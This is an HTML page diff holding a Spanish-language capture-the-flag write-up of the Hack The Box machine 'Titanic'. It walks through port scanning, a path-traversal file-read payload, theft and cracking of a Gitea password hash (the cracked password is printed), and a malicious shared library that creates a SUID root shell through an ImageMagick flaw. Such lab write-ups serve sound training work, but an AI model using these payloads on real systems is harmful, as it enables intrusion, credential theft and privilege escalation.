@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="h-full">
+   <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Envertex | Titanic </title>
+      <meta name="description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications. Filter by difficulty, OS, and certification.">
+      <meta name="author" content="Your Name">
+      <meta name="robots" content="index, follow">
+      <!-- OpenGraph -->
+      <meta property="og:type" content="website">
+      <meta property="og:title" content="Envertex Machines">
+      <meta property="og:description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.">
+      <meta property="og:url" content="https://envertex.github.io/machines/machines.html">
+      <meta property="og:site_name" content="Envertex Lab">
+      <meta property="og:image" content="https://envertex.github.io/images/profile.png">
+      <meta property="og:image:width" content="1200">
+      <meta property="og:image:height" content="630">
+      <!-- Twitter -->
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Envertex Machines">
+      <meta name="twitter:description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.">
+      <meta name="twitter:image" content="https://envertex.github.io/images/profile.png">
+      <!-- Schema.org JSON-LD -->
+      <script type="application/ld+json">
+         {
+           "@context": "https://schema.org",
+           "@type": "WebPage",
+           "name": "Envertex Machines",
+           "description": "Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.",
+           "url": "https://envertex.github.io/machines/machines.html",
+           "author": {
+             "@type": "Person",
+             "name": "Your Name",
+             "email": "your.email@example.com"
+           },
+           "publisher": {
+             "@type": "Organization",
+             "name": "Envertex",
+             "logo": {
+               "@type": "ImageObject",
+               "url": "https://envertex.github.io/images/profile.png"
+             }
+           }
+         }
+      </script>
+      <!-- Fonts -->
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+      <!-- CSS -->
+      <link rel="stylesheet" href="/css/theme.min.f1ceb355b0c4c1df17e287a25fb4c6379b07e40c5d26feac7fa2500f0a37cb75.css">
+      <link rel="stylesheet" href="/css/syntax-dark.min.b01037e5609e6260b74d6fcdd6d5131e8dcbc4d46d6ef4bfbe5a60bdfc1a9f30.css" id="syntax-dark-theme" class="syntax-theme">
+      <link rel="stylesheet" href="/css/syntax-light.min.9602bc2fcef52b4c62e05eae14b48ba428e114f116e993e504d83ed5a3aeda98.css" id="syntax-light-theme" class="syntax-theme" disabled>
+      <link rel="stylesheet" href="/css/bundle.min.82559bd59b12235c47e448881d968913485f1bccd9e6c7104066c2e3f1d92bbb.css">
+      <!-- Favicon -->
+      <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <!-- Theme Switcher -->
+      <script>
+         (function() {
+           const storedTheme = localStorage.getItem('theme');
+           const systemPrefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+           const theme = storedTheme || (systemPrefersLight ? 'light' : 'dark');
+           document.documentElement.setAttribute('data-theme', theme);
+         
+           const syntaxDark = document.getElementById('syntax-dark-theme');
+           const syntaxLight = document.getElementById('syntax-light-theme');
+           if (theme === 'light') { syntaxDark.disabled = true; syntaxLight.disabled = false; } 
+           else { syntaxDark.disabled = false; syntaxLight.disabled = true; }
+         
+           const observer = new MutationObserver(() => {
+             const currentTheme = document.documentElement.getAttribute('data-theme');
+             if (currentTheme === 'light') { syntaxDark.disabled = true; syntaxLight.disabled = false; } 
+             else { syntaxDark.disabled = false; syntaxLight.disabled = true; }
+           });
+           observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] });
+         })();
+      </script>
+   </head>
+   <body class="flex flex-col min-h-screen">
+      <a href="#main-content" class="skip-to-main">Skip to main content</a>
+      <!-- Header -->
+      <header class="sticky-header">
+         <div class="header-container">
+            <nav class="header-nav" aria-label="Main navigation">
+               <div class="header-content">
+                  <div class="header-logo">
+                     <a href="/" class="logo-link">✦ Envertex</a>
+                  </div>
+                  <div class="header-menu">
+                     <ul class="menu-list">
+                        <li class="menu-item"><a href="../index.html" class="menu-link">Home</a></li>
+                        <li class="menu-item"><a href="/posts/posts.html" class="menu-link">Posts</a></li>
+                        <li class="menu-item"><a href="/notes/notes.html" class="menu-link">Notes</a></li>
+                        <li class="menu-item"><a href="/machines/machines.html" class="menu-link active">Machines</a></li>
+                        <li class="menu-item"><a href="/about/about.html" class="menu-link">About</a></li>
+                     </ul>
+                     <button id="search-toggle" class="search-toggle" aria-label="Search">
+                        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                     </button>
+                     <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
+                        <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+                        </svg>
+                        <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+                        </svg>
+                     </button>
+                  </div>
+               </div>
+            </nav>
+         </div>
+      </header>
+      <main id="main-content" class="post-vertex-main" role="main" style="display:flex; gap:2rem; max-width:1200px; margin:0 auto; padding:2rem 1rem;">
+         <!-- TOC lateral fijo -->
+         <aside id="post-toc" class="post-vertex-toc" style="
+            position: sticky;
+            top: calc( var(--header-height, 80px) + 1rem ); /* ajusta según tu header */
+            flex-shrink: 0;
+            width: 250px;
+            align-self: flex-start;
+            ">
+            <h2 class="post-vertex-toc-title">Contents</h2>
+            <nav class="post-vertex-toc-nav">
+               <ul>
+                  <!-- Se llenará automáticamente -->
+               </ul>
+            </nav>
+         </aside>
+         <!-- Main content -->
+         <article class="post-vertex-article" style="flex:1; min-width:0;">
+            <header class="post-vertex-header">
+               <h1 class="post-vertex-title">
+                  
+               </h1>
+               <div class="post-vertex-meta">
+                  <span class="post-vertex-reading" datetime="2026-01-06">
+                  </span>
+               </div>
+               <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/main.png"/>
+            </header>
+            <div class="post-vertex-content">
+
+
+               <h2 id="informaci-n-general">
+ Informaci&oacute;n General
+</h2>
+<h3 id="contexto-del-sistema">
+ Contexto del sistema
+</h3>
+<p>
+ El objetivo de este laboratorio corresponde a una m&aacute;quina Linux de Hack The Box accesible mediante la direcci&oacute;n IP
+ <code>
+  10.129.231.221
+ </code>
+ . El sistema expone un servicio web que simula una plataforma de compra de pasajes y un servicio SSH restringido. La m&aacute;quina presenta una cadena de vulnerabilidades realista que combina fallos de control de acceso, Local File Inclusion (LFI), exposici&oacute;n de bases de datos internas, cracking de credenciales y una escalada de privilegios mediante una vulnerabilidad conocida en ImageMagick ejecutada a trav&eacute;s de un script automatizado.
+</p>
+<p>
+ El compromiso completo sigue un flujo alineado con escenarios OSCP reales, donde la enumeraci&oacute;n exhaustiva y el an&aacute;lisis del c&oacute;digo fuente resultan determinantes para el &eacute;xito del ataque.
+</p>
+<h2 id="enumeraci-n">
+ Enumeraci&oacute;n
+</h2>
+<h3 id="escaneo-de-puertos-y-servicios">
+ Escaneo de puertos y servicios
+</h3>
+<p>
+ La enumeraci&oacute;n comienza con un escaneo completo de puertos TCP para identificar la superficie de ataque expuesta por el sistema, priorizando rapidez y evitando resoluci&oacute;n DNS.
+</p>
+<pre><code class="lang-bash">sudo nmap -p- -sS -Pn -n --open --min-rate <span class="hljs-number">6500</span> --max-retries <span class="hljs-number">1</span> --initial-rtt-timeout <span class="hljs-number">100</span>ms --max-rtt-timeout <span class="hljs-number">300</span>ms -T4 <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.221</span> -oG allPortsTCP
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img1.png"/>
+</p>
+<p>
+ El resultado revela &uacute;nicamente los puertos 22 (SSH) y 80 (HTTP). Con esta informaci&oacute;n se procede a un escaneo m&aacute;s espec&iacute;fico para identificar versiones y tecnolog&iacute;as.
+</p>
+<pre><code class="lang-bash">nmap -p22,<span class="hljs-number">80</span> -sCV <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.221</span> -oN infoPortsTCP
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img2.png"/>
+</p>
+<p>
+ El puerto 80 aloja una aplicaci&oacute;n web personalizada, mientras que SSH parece restringido a usuarios internos, descartando un acceso directo en esta fase inicial.
+</p>
+<h3 id="enumeraci-n-web-y-directorios">
+ Enumeraci&oacute;n web y directorios
+</h3>
+<p>
+ Al acceder al servicio web, se presenta un panel que simula un sistema de compra de pasajes.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img3.png"/>
+</p>
+<p>
+ La aplicaci&oacute;n permite reservar un pasaje mediante un bot&oacute;n ubicado en la esquina superior derecha.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img4.png"/>
+</p>
+<p>
+ Tras completar el proceso de reserva, el sistema genera autom&aacute;ticamente un archivo en formato JSON que se descarga al cliente.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img5.png"/>
+</p>
+<p>
+ La descarga de archivos generados din&aacute;micamente es siempre un punto cr&iacute;tico en entornos CTF y escenarios reales, por lo que se decide interceptar la solicitud utilizando Burp Suite para analizar su comportamiento interno.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img6.png"/>
+</p>
+<p>
+ En la respuesta del servidor se identifica un endpoint interesante:
+</p>
+<pre><code>/download?ticket=<span class="hljs-number">57</span>c2e28b<span class="hljs-number">-8</span>a85<span class="hljs-number">-4</span>ba3-a9a1<span class="hljs-number">-3</span>b24a10abcd8.json
+</code></pre>
+<p>
+ Este par&aacute;metro sugiere que el backend utiliza directamente el valor proporcionado para acceder a archivos en el sistema.
+</p>
+<h3 id="tecnolog-as-y-archivos-expuestos">
+ Tecnolog&iacute;as y archivos expuestos
+</h3>
+<p>
+ Al manipular el par&aacute;metro
+ <code>
+  ticket
+ </code>
+ , se comprueba la existencia de una vulnerabilidad de Local File Inclusion. Al introducir un payload de traversal cl&aacute;sico, el servidor devuelve correctamente el contenido del archivo solicitado.
+</p>
+<pre><code>http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/download?ticket=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img7.png"/>
+</p>
+<p>
+ Si bien el LFI es funcional, inicialmente no se logra extraer informaci&oacute;n cr&iacute;tica adicional, por lo que se decide continuar con la enumeraci&oacute;n para encontrar nuevas superficies de ataque.
+</p>
+<p>
+ Se procede a enumerar virtual hosts utilizando
+ <code>
+  ffuf
+ </code>
+ .
+</p>
+<pre><code class="lang-bash">ffuf -u http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">//</span> -H <span class="hljs-string">"Host: FUZZ.titanic.htb"</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">110000</span>.txt -t <span class="hljs-number">200</span> -fs <span class="hljs-number">0</span> -fl <span class="hljs-number">10</span>
+</code></pre>
+<p>
+ El escaneo revela un subdominio adicional.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img8.png"/>
+</p>
+<p>
+ El virtual host identificado es:
+</p>
+<pre><code>dev<span class="hljs-selector-class">.titanic</span><span class="hljs-selector-class">.htb</span>
+</code></pre>
+<p>
+ Al acceder a este subdominio, se descubre una instancia de Gitea expuesta p&uacute;blicamente.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img9.png"/>
+</p>
+<h2 id="explotaci-n">
+ Explotaci&oacute;n
+</h2>
+<h3 id="identificaci-n-de-la-vulnerabilidad">
+ Identificaci&oacute;n de la vulnerabilidad
+</h3>
+<p>
+ Se procede a registrar una cuenta en la instancia de Gitea para acceder a las funcionalidades internas. Una vez autenticado, se navega a la secci&oacute;n
+ <strong>
+  Explore
+ </strong>
+ , donde se listan repositorios p&uacute;blicos.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img10.png"/>
+</p>
+<p>
+ Se identifican dos repositorios relevantes:
+ <code>
+  docker-config
+ </code>
+ y
+ <code>
+  flask-app
+ </code>
+ . El repositorio
+ <code>
+  docker-config
+ </code>
+ resulta especialmente interesante, ya que contiene configuraciones relacionadas con Docker, Gitea y MySQL, lo que sugiere que refleja fielmente el entorno de la m&aacute;quina v&iacute;ctima.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img11.png"/>
+</p>
+<p>
+ Al descargar y descomprimir el repositorio, se observa la estructura completa del proyecto.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img12.png"/>
+</p>
+<h3 id="ejecuci-n-remota-de-comandos">
+ Ejecuci&oacute;n remota de comandos
+</h3>
+<p>
+ Con el objetivo de comprender el entorno real, se decide levantar localmente la infraestructura definida en los archivos Docker. Se inicia primero el contenedor de MySQL, ya que ambos servicios funcionan de forma independiente.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img13.png"/>
+</p>
+<p>
+ Antes de levantar Gitea, se ajusta la ruta de vol&uacute;menes en el archivo
+ <code>
+  docker-compose.yml
+ </code>
+ para replicar el entorno real.
+</p>
+<pre><code><span class="hljs-symbol">volumes:</span>
+  - <span class="hljs-regexp">/tmp/data</span><span class="hljs-symbol">:/data</span>
+</code></pre>
+<p>
+ Posteriormente, se levanta el contenedor de Gitea.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img14.png"/>
+</p>
+<p>
+ Una vez iniciado, se accede a la interfaz web local.
+</p>
+<pre><code><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:3000</span>
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img15.png"/>
+</p>
+<p>
+ Se mantiene la configuraci&oacute;n por defecto y se completa la instalaci&oacute;n. Luego, se accede al contenedor para inspeccionar su contenido interno.
+</p>
+<pre><code class="lang-bash">docker exec -<span class="hljs-keyword">it</span> gitea bash
+</code></pre>
+<p>
+ Dentro del contenedor se identifica el archivo
+ <code>
+  gitea.db
+ </code>
+ .
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img16.png"/>
+</p>
+<p>
+ Este an&aacute;lisis, combinado con la vulnerabilidad LFI previamente identificada, permite inferir la ruta real del archivo de base de datos en la m&aacute;quina v&iacute;ctima.
+</p>
+<pre><code><span class="hljs-regexp">/home/</span>developer<span class="hljs-regexp">/gitea/</span>data<span class="hljs-regexp">/gitea/gi</span>tea.db
+</code></pre>
+<h3 id="obtenci-n-de-acceso-interactivo">
+ Obtenci&oacute;n de acceso interactivo
+</h3>
+<p>
+ Utilizando nuevamente el LFI, se descarga directamente la base de datos de Gitea desde el servidor.
+</p>
+<pre><code>http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/download?ticket=/</span>home<span class="hljs-regexp">/developer/gi</span>tea<span class="hljs-regexp">/data/gi</span>tea<span class="hljs-regexp">/gitea.db</span>
+</code></pre>
+<p>
+ Una vez obtenida la base de datos, se analiza utilizando
+ <code>
+  sqlite3
+ </code>
+ .
+</p>
+<pre><code class="lang-bash">sqlite3 gitea<span class="hljs-meta">.db</span>
+</code></pre>
+<p>
+ Se enumeran las tablas disponibles.
+</p>
+<pre><code class="lang-sql"><span class="hljs-title">.tables</span>
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img17.png"/>
+</p>
+<p>
+ Dentro de la tabla
+ <code>
+  user
+ </code>
+ se identifican hashes de contrase&ntilde;as. El an&aacute;lisis revela que Gitea utiliza PBKDF2, lo que requiere un procesamiento espec&iacute;fico para su cracking.
+</p>
+<p>
+ Se extraen los campos relevantes.
+</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">PRAGMA</span> table_info(<span class="hljs-keyword">user</span>);
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>, passwd, <span class="hljs-keyword">salt</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>;
+</code></pre>
+<p>
+ Para convertir estos valores a un formato compatible con Hashcat, se utiliza la herramienta 
+ <code>
+  gitea2hashcat.py
+ </code>
+ .
+</p>
+<p>gitea2hashcat:
+   <a href="https://github.com/hashcat/hashcat/blob/master/tools/gitea2hashcat.py"> https://github.com/hashcat/hashcat/blob/master/tools/gitea2hashcat.py  </a>
+</p>
+<pre><code class="lang-bash">python3 gitea2hashcat<span class="hljs-selector-class">.py</span> <span class="hljs-string">'8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'</span>
+</code></pre>
+<p>
+ El hash resultante se crackea con Hashcat.
+</p>
+<pre><code class="lang-bash">hashcat -m <span class="hljs-number">10900</span> hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img18.png"/>
+</p>
+<p>
+ La contrase&ntilde;a recuperada es:
+</p>
+<pre><code><span class="hljs-number">25282528</span>
+</code></pre>
+<p>
+ Con estas credenciales, se accede exitosamente v&iacute;a SSH y se obtiene la flag de usuario.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img19.png"/>
+</p>
+<h2 id="subida-de-privilegios">
+ Subida de privilegios
+</h2>
+<h3 id="enumeraci-n-de-vectores-de-escalada">
+ Enumeraci&oacute;n de vectores de escalada
+</h3>
+<p>
+ Una vez autenticado como
+ <code>
+  developer
+ </code>
+ , se realiza una enumeraci&oacute;n b&aacute;sica del sistema. Al no identificar vectores evidentes, se ejecuta
+ <code>
+  linpeas.sh
+ </code>
+ para una inspecci&oacute;n m&aacute;s profunda.
+</p>
+<p>
+ Durante el an&aacute;lisis, se detecta un directorio de scripts perteneciente a la aplicaci&oacute;n.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img20.png"/>
+</p>
+<p>
+ Dentro de este directorio se encuentra un script que utiliza
+ <code>
+  /usr/bin/magick
+ </code>
+ .
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img21.png"/>
+</p>
+<h3 id="an-lisis-de-la-vulnerabilidad">
+ An&aacute;lisis de la vulnerabilidad
+</h3>
+<p>
+ Se verifica la versi&oacute;n de ImageMagick instalada en el sistema.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img22.png"/>
+</p>
+<p>
+ La versi&oacute;n corresponde a una afectada por la vulnerabilidad documentada en el advisory oficial:
+</p>
+<p>Documentacion:
+   <a href=" https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8 "> https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8 </a>
+</p>
+<pre><code>GHSA<span class="hljs-number">-8</span>rxc<span class="hljs-number">-922</span>v-phg8
+</code></pre>
+<p>
+ El script vulnerable es el siguiente:
+</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">cat</span> identify_images.<span class="hljs-keyword">sh</span>
+</code></pre>
+<p>
+ El script cambia al directorio de im&aacute;genes y ejecuta
+ <code>
+  magick identify
+ </code>
+ sobre todos los archivos
+ <code>
+  .jpg
+ </code>
+ , lo que permite la carga din&aacute;mica de bibliotecas compartidas desde el mismo directorio.
+</p>
+<h3 id="explotaci-n-y-obtenci-n-de-root">
+ Explotaci&oacute;n y obtenci&oacute;n de root
+</h3>
+<p>
+ Se navega al directorio donde se ejecuta el script y se compila una biblioteca maliciosa que ser&aacute; cargada autom&aacute;ticamente por ImageMagick.
+</p>
+<pre><code class="lang-bash">cd /opt/app/<span class="hljs-keyword">static</span>/assets/images
+gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+__attribute__((constructor)) void init(){
+    system(<span class="hljs-string">"cp /bin/sh /tmp &amp;&amp; chmod u+s /tmp/sh"</span>)<span class="hljs-comment">;</span>
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
+}
+EOF
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img23.png"/>
+</p>
+<p>
+ Tras esperar a la ejecuci&oacute;n autom&aacute;tica del script mediante cron, se obtiene una shell con privilegios elevados.
+</p>
+<pre><code class="lang-bash">/tmp/sh -<span class="hljs-selector-tag">p</span>
+whoami
+</code></pre>
+
+
+            </div>
+         </article>
+      </main>
+      <script>
+         document.addEventListener('DOMContentLoaded', () => {
+           const content = document.querySelector('.post-vertex-content');
+           const tocNav = document.querySelector('.post-vertex-toc-nav ul');
+           if (!content || !tocNav) return;
+         
+           const headers = content.querySelectorAll('h2, h3');
+         
+           headers.forEach(header => {
+             if (!header.id) {
+               header.id = header.textContent.trim().toLowerCase()
+                 .replace(/\s+/g, '-')
+                 .replace(/[^\w\-]/g, '');
+             }
+           });
+         
+           let currentUlH2 = null;
+         
+           headers.forEach(header => {
+             if (header.tagName.toLowerCase() === 'h2') {
+               const li = document.createElement('li');
+         
+               const wrapper = document.createElement('div');
+               wrapper.style.display = 'inline-flex';
+               wrapper.style.alignItems = 'center';
+               wrapper.style.gap = '0.3rem';
+         
+               const toggle = document.createElement('span');
+               toggle.textContent = '▸';
+               toggle.style.userSelect = 'none';
+               toggle.style.fontWeight = 'bold';
+               toggle.style.cursor = 'pointer';
+         
+               const a = document.createElement('a');
+               a.href = `#${header.id}`;
+               a.textContent = header.textContent;
+               a.style.textDecoration = 'none';
+               a.style.fontWeight = 'bold';
+               a.style.color = 'var(--text-primary)';
+         
+               wrapper.appendChild(toggle);
+               wrapper.appendChild(a);
+               li.appendChild(wrapper);
+         
+               const ulH3 = document.createElement('ul');
+               ulH3.style.display = 'none';
+               ulH3.style.paddingLeft = '1.5rem';
+               li.appendChild(ulH3);
+         
+               wrapper.addEventListener('click', () => {
+                 if (ulH3.style.display === 'none') {
+                   ulH3.style.display = 'block';
+                   toggle.textContent = '▾';
+                 } else {
+                   ulH3.style.display = 'none';
+                   toggle.textContent = '▸';
+                 }
+                 document.getElementById(header.id).scrollIntoView({ behavior: 'smooth' });
+               });
+         
+               tocNav.appendChild(li);
+               currentUlH2 = ulH3;
+         
+             } else if (header.tagName.toLowerCase() === 'h3' && currentUlH2) {
+               const li = document.createElement('li');
+               li.style.marginBottom = '0.25rem';
+         
+               const a = document.createElement('a');
+               a.href = `#${header.id}`;
+               a.textContent = header.textContent;
+               a.style.textDecoration = 'none';
+               a.style.fontWeight = 'normal';
+               a.style.color = 'var(--text-muted)';
+         
+               a.addEventListener('click', e => {
+                 e.preventDefault();
+                 document.getElementById(header.id).scrollIntoView({ behavior: 'smooth' });
+               });
+         
+               li.appendChild(a);
+               currentUlH2.appendChild(li);
+             }
+           });
+         });
+         document.addEventListener("DOMContentLoaded", () => {
+         
+           const content = document.querySelector(".post-vertex-content");
+           const metaLine = document.querySelector(".post-vertex-reading");
+         
+           if (!content || !metaLine) return;
+         
+           /* =========================
+              FECHA
+           ========================= */
+           const rawDate = metaLine.getAttribute("datetime");
+           let formattedDate = "";
+         
+           if (rawDate) {
+             const date = new Date(rawDate);
+             formattedDate = date.toLocaleDateString("en-US", {
+               day: "numeric",
+               month: "long",
+               year: "numeric"
+             });
+           }
+         
+           /* =========================
+              CONTAR PALABRAS (SIN IMÁGENES)
+           ========================= */
+           const clone = content.cloneNode(true);
+         
+           clone.querySelectorAll("img, svg, video, iframe").forEach(el => el.remove());
+         
+           const text = clone.innerText
+             .replace(/\s+/g, " ")
+             .trim();
+         
+           const words = text ? text.split(" ").length : 0;
+         
+           /* =========================
+              TIEMPO DE LECTURA
+           ========================= */
+           const wordsPerMinute = 200;
+           const readingTime = Math.max(1, Math.ceil(words / wordsPerMinute));
+         
+           /* =========================
+              SALIDA FINAL (UNA SOLA LÍNEA)
+           ========================= */
+           metaLine.textContent =
+             `${formattedDate} • ${words.toLocaleString()} words • ${readingTime} min read`;
+         });
+         
+         
+      </script>
+      <footer>
+         <footer class="site-footer">
+            <div class="footer-content">
+               <p class="footer-text">
+                  &copy; 2026 Your Site Title. 
+               </p>
+               <div class="footer-social">
+                  <div class="social-links">
+                     <a href="https://github.com/yourusername" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="GitHub">
+                        <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path>
+                        </svg>
+                     </a>
+                     <a href="https://www.linkedin.com/in/yourprofile" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="LinkedIn">
+                        <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path>
+                        </svg>
+                     </a>
+                     <a href="mailto:your.email@example.com" class="social-link" aria-label="Email">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
+                        </svg>
+                     </a>
+                  </div>
+               </div>
+            </div>
+         </footer>
